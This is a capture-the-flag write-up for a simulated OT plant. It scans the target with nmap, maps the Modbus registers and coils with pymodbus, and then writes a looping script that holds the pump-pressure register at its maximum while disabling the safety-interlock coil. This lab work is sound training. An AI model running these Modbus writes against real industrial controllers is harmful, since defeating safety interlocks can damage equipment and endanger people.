# [Kaboom](https://tryhackme.com/room/kaboom)

## You've been called in to assess an OT environment.

This challenge drops you into the shoes of the APT operator: With a single crafted Modbus, you over-pressurise the main pump, triggering a thunderous blow-out that floods the plant with alarms. While chaos reigns, your partner ghosts through the shaken DMZ and installs a stealth implant, turning the diversion’s echo into your persistent beachhead.

### What's the flag?

1. Reconnaissance - Full Port Scan

Start with a full TCP port sweep, service/version detection, and default scripts against the target box.

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 59:45:6b:36:8f:c4:0f:91:60:5e:17:56:3b:bd:98:06 (ECDSA)
|_  256 4b:33:d0:8d:6e:3e:e1:00:48:2f:20:ec:17:34:99:61 (ED25519)
80/tcp    open  http          Werkzeug httpd 3.1.3 (Python 3.12.3)
|_http-title: PLC CCTV Simulator
|_http-server-header: Werkzeug/3.1.3 Python/3.12.3
102/tcp   open  iso-tsap      Siemens S7 PLC
| s7-info:
|   Module: 6ES7 315-2EH14-0AB0
|   Basic Hardware: 6ES7 315-2EH14-0AB0
|   Version: 3.2.6
|   System Name: SNAP7-SERVER
|   Module Type: CPU 315-2 PN/DP
|   Serial Number: S C-C2UR28922012
|_  Copyright: Original Siemens Equipment
| fingerprint-strings:
|   TerminalServerCookie:
|_    Cookie: mstshash=nmap
502/tcp   open  modbus        Modbus TCP
1880/tcp  open  vsat-control?
| fingerprint-strings:
|   DNSVersionBindReqTCP, RPCCheck:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1733
|     ETag: W/"6c5-hGVEFL4qpfS9qVbAlfbm9AL7VT0"
|     Date: Thu, 20 Aug 2026 15:23:21 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
|     <meta name="apple-mobile-web-app-capable" content="yes">
|     <meta name="mobile-web-app-capable" content="yes">
|     <!--
|     Copyright OpenJS Foundation and other contributors, https://openjsf.org/
|     Licensed under the Apache License, Version 2.0 (the "License");
|     this file except in compliance with the License.
|     obtain a copy of the License at
|     http://www.apache.org/licenses/LICENSE-2.0
|     Unless required by applicable law or agreed to in writing, softwa
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 204 No Content
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET,PUT,POST,DELETE
|     Vary: Access-Control-Request-Headers
|     Content-Length: 0
|     Date: Thu, 20 Aug 2026 15:23:21 GMT
|_    Connection: close
8080/tcp  open  http          Werkzeug httpd 2.3.7 (Python 3.12.3)
|_http-server-header: Werkzeug/2.3.7 Python/3.12.3
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /login
44818/tcp open  EtherNetIP-2?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1880-TCP:V=7.99%I=7%D=8/20%Time=6A871BEA%P=x86_64-pc-linux-gnu%r(Ge
...
SF:nection:\x20close\r\n\r\n");
Service Info: OS: Linux; Device: specialized; CPE: cpe:/o:linux:linux_kernel
```

Modbus TCP on 502 stands out immediately: it's an unauthenticated, unencrypted industrial protocol. Anyone who can reach the port can read and write PLC registers and coils directly. That's the path of least resistance into the process, so it's where the attack begins.

2. Talking to Modbus - Passive Monitoring

Before touching anything, passively poll the holding registers to see what "normal" looks like.

```py
import sys
import time
from pymodbus.client import ModbusTcpClient as ModbusClient

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
    rr = client.read_holding_registers(address=0, count=16, device_id=1)
    if rr.isError():
        print("Error:", rr)
    else:
        print(rr.registers)
    time.sleep(1)
```

This prints a live list of 16 holding-register values, refreshed once a second. Watching the values fluctuate over time confirms the simulator is actively running a process loop.

3. Mapping the Register/Coil Space

A count of 16 starting at address 0 only shows a narrow slice of the device. Modbus limits a single request to 125 registers or 2000 coils per PCC/TCP frame, so to enumerate a wider range you need to chunk requests and stitch the results back together.

```py
import sys
import time
from pymodbus.client import ModbusTcpClient as ModbusClient

ip = sys.argv[1]
start = int(sys.argv[2]) if len(sys.argv) > 2 else 0
count = int(sys.argv[3]) if len(sys.argv) > 3 else 20

client = ModbusClient(ip, port=502)
client.connect()

HR_MAX = 125
COIL_MAX = 2000

def read_chunked(read_fn, start, count, max_chunk):
    result = []
    addr = start
    remaining = count
    while remaining > 0:
        chunk = min(max_chunk, remaining)
        rr = read_fn(address=addr, count=chunk, device_id=1)
        if rr.isError():
            print(f"Error reading at {addr}: {rr}")
            return result
        result.extend(rr.registers if hasattr(rr, "registers") else rr.bits)
        addr += chunk
        remaining -= chunk
    return result

while True:
    hr = read_chunked(client.read_holding_registers, start, count, HR_MAX)
    print("Holding registers:", hr)

    co = read_chunked(client.read_coils, start, count, COIL_MAX)
    print("Coils:", co)

    time.sleep(1)
```

Run a wide sweep to build a full map of the address space: `python3 script.py <TARGET_IP> 0 500`

Cross-referencing which values move against operator actions in the web dashboards lets you infer what each register/coil represents. In this simulator:

- **Holding register 0** tracks the main pump's pressure/output level.
- **Coil 15** acts as a safety interlock / high-pressure cutoff. When `True`, the simulator's safety logic prevents the pressure register from exceeding a safe threshold; when forced to `False`, that protection is bypassed.

This mirrors a very real ICS attack pattern: many historical ICS incidents involved an attacker directly manipulating a PLC's control registers or safety logic once network access was obtained, precisely because protocols like Modbus TCP have no built-in authentication.

4. Triggering the Blow-Out

With the interlock coil identified, the attack is now straightforward: disable the safety coil and drive the pressure register to its maximum value.

```py
import sys
import time
from pymodbus.client import ModbusTcpClient as ModbusClient

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()

try:
    while True:
        client.write_register(address=0, value=65535, device_id=1)
        client.write_coil(address=15, value=False, device_id=1)
        time.sleep(1)
except KeyboardInterrupt:
    print("Stopped.")
finally:
    client.close()
```

`write_register(address=0, value=65535, ...)` pins holding register 0 to `0xFFFF`, the maximum value a 16-bit unsigned Modbus register can hold. `write_coil(address=15, value=False, ...)` simultaneously disables the safety interlock, so nothing in the simulated logic clamps the pressure back down. The loop keeps re-asserting both writes every second so any control-loop logic trying to self-correct is overridden continuously.

Within a few seconds, the dashboard interface should reflect the over-pressure event.

5. Retrieving the Flag

With the plant in its blown-out state, browse to the dashboard web front-end: `http://<TARGET_IP>/`

The page updates to reflect the incident state triggered by the Modbus attack and reveals the flag.

[SCREEN01]
